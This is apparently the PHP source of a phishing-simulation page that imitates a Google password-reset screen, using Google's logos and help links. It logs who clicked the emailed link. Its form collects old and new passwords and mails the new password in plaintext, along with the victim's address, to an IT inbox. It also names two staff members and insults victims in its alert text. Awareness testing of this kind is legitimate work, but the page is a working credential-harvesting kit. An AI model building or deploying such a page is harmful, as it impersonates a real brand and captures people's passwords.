<!DOCTYPE html>
<html>
	<?php
	ini_set('SMTP','1.2.3.13');
	ini_set('smtp_port',25); 
	If (isset($_GET["email"])) {
		$email = $_GET['email'];  
		$to = 'itdept@example.org';
		$subject='Phishing Victim';
		$message = "$email clicked on the link within the email because they are a dumbass!";
		$headers = 'From: donotreply@example.org' . "\r\n" .
			'X-Mailer: PHP/' . phpversion();
		mail($to, $subject, $message, $headers);
		/*echo "Email: \"".$email."\"\n message of \"".$message."\"\n to: \"".$to."\"\n \"".$from."\"\n \"".$subject."\"\n"; */
	} else {
		/* Do NOTHING HERE */
	}
	?>
	<head>
		<title>
			Google Password Reset
		</title>
		<style>
			body { 
				font-family: 13px'arial', sans-serif;
			}
			.divA{ 
				background-color: #4885ed;
				width: 34%;
				margins: auto;
				float: left;
				display: inline-block;
			}
			.divB{ 
				background-color: #4885ed;
				width: 32%;
				float: left;
				margins: auto;
				display: inline-block;
			}
			.divC{ 
				background-color: #4885ed;
				width: 34%;
				margins: auto;
				float: right;
				display: inline-block;
			}
			.div2 {
				width: 34%;
				height: 100%;
				display: inline-block;
				float: left;
				background-color: #FFFFFF;
			}
			.div3{
				width: 32%;
				height: 100%;
				float: left;
				display: inline-block;
				background-color: #FFFFFF;
			}
			.div4{
				width: 34%;
				height: 100%;
				display: inline-block;
				float: right;
				background-color: #FFFFFF;
			}
			.img2 {
				display: block;
				width: 90px;
				height: 50px;
				padding-left: 25px;
				padding-right: 1600px;
				float: left;
				background-color: #FFFFFF;
			}
			.img3 {
				display: block;
				height: 30px;
				float: left;
			}
			h2 {
				color: #ffffff;
				padding-right: 50px;
			}
			.align-center {
				display: block;
				margin: 1.0em auto;
				text-align: center;
			}
			p.someText {
				color: red;
				display: block;
				font-size: 200%;
			}
			<!-- AFTER HERE IS THE STUFF FROM https://webdesign.tutsplus.com/tutorials/how-to-make-floating-input-labels-with-html5-validation--cms-26120 -->}
					
					input [type=submit] {
					border: 2px solid #bdbdbd
					border-color: #bdbdbd;
					}
					input {
					border: 2px solid #f2f2f2;
					outline: none;
					}
					input:focus {
					border-color: #d9d9d9;
					}
					input:valid {
					border-color: #42d142;
					}
					input:invalid {
					border-color: #ff8e7a;
					
					form {
					margin: auto;
					}

	</style>
	</head>
	<body>
	<div>
		<img src="https://i.kinja-img.com/gawker-media/image/upload/s--pEKSmwzm--/c_scale,fl_progressive,q_80,w_800/1414228815325188681.jpg" alt="Google Logo" class="img2">
		<img src="https://www.gstatic.com/ac/security/landing_header_600x160_e1ba484999a4af8b05da311f215107ae.png" alt="Google security" class="img3">
	</div>
		<br style="clear: right; clear: left;" />
		<div class="divA"><h2><br /></h2></div>
		<div class="divB">
			<h2>Google Password Reset<br /></h2>
		</div>
		<div class="divC"><h2><br /></h2></div>
		<br style="clear: right; clear: left;" />
		<div class="div2"><p></p></div>
		<div class="div3">
									
					<!-- <fieldset class="align-center"> -->
					<?php
						if (empty($_POST))    /* display the contact form */
						{
							$user = strstr($email, '@', true);
							$len = strlen($user) - 1;
							$fChar = $user[0];
							$lChar = $user[$len];		
							$maskEmail = $fChar.'*********'.$lChar.'@nlcmh.org';
							
						?>
						<p>Choose a strong password and don't reuse it for other accounts. <a href="https://support.google.com/accounts/answer/32040?visit_id=1-636108546046692424-2366324280&p=pw_dont_reuse&hl=en&rd=1">Learn more.</a><br /><br />
						Changing your password will sign you out of all your devices, including your phone. You will need to enter your new password on all your devices.</p>
						<form  action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST" enctype="multipart/form-data">
							<label>
								Email Address:<br />
								<input name="maskEmail" type="text"  value="<?php echo htmlspecialchars($maskEmail); ?>" readonly>
							<br /><br /></label>
							<label>
								Old Password:<br />
								<input type="password" name="oPassword" type="text" pattern=".{3,}" required title="Enter at least 3 characters.">
							<br /><br /></label>
							<label>
								New Password:<br />
								<input type="password" name="nPassword" type="text" pattern=".{3,}" required title="Enter at least 3 characters.">
							<br /><br /></label>
							<label>
								Confirm Password:<br />
								<input type="password" name="cPassword" type="text" pattern=".{3,}" required title="Enter at least 3 characters.">
							</label>
							<p>Use at least 8 characters. Don&#39;t use a password from another site, or something too obvious like your pet&#39;s name. 
							<a href="https://support.google.com/accounts/answer/32040?visit_id=1-636111051331277261-2366324280&p=pw_change&hl=en&rd=1">Why?</a></p>
							<input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>" >
							<input type="submit" value="Change Password">
						</form>
						
					<?php
						} else {
						$email = $_REQUEST['email'];
						$nPassword = $_REQUEST['nPassword'];
						$cPassword = $_REQUEST['cPassword'];
						if (($nPassword=="")||($cPassword==""))
							{
							echo "All fields are required, please fill <a href=\"\">the form</a> again.";
							} else {
								ini_set('SMTP','1.2.3.13');
								ini_set('smtp_port',25); 
									/* $email = $_GET['email'];  */
									$to = 'itdept@example.org';
									$subject='Phishing Victim';
									$message = "$email Filled out the change password page and clicked submit. Using this password: $nPassword";
									$headers = 'From: donotreply@example.org' . "\r\n" .
										'X-Mailer: PHP/' . phpversion();
									mail($to, $subject, $message, $headers);
									/*echo "Email: \"".$email."\"\n message of \"".$message."\"\n to: \"".$to."\"\n \"".$from."\"\n \"".$subject."\"\n"; */
							?>
							
							<img src="https://www.conney.com/wcsstore/Conney/images/fullsize/38167.gif" alt="Exclamation"> <p class="someText"><STRONG>EMAIL SENT: Please at your convenience go see Pam Dushane or Jeremiah Williams in IT. 
							Please do not discuss this with other employees as it is critical to the security of our network!</STRONG></p>
							
							<?php
							}
						}  
					?>	
					<!-- </fieldset> -->
		</div>
		<div class="div4"><p></p></div>
	</body>
</html>
